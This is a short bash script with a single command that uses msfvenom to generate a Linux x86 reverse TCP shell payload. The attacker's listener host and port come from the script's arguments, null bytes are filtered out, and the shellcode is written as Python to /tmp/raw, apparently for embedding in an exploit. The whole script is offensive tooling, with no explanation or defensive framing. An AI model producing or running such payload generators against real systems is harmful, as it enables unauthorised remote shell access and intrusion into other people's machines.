#!/bin/bash 

msfvenom -p linux/x86/shell_reverse_tcp LHOST=$1 LPORT=$2 EXITFUNC=thread -f python -a x86 -b '\x00' > /tmp/raw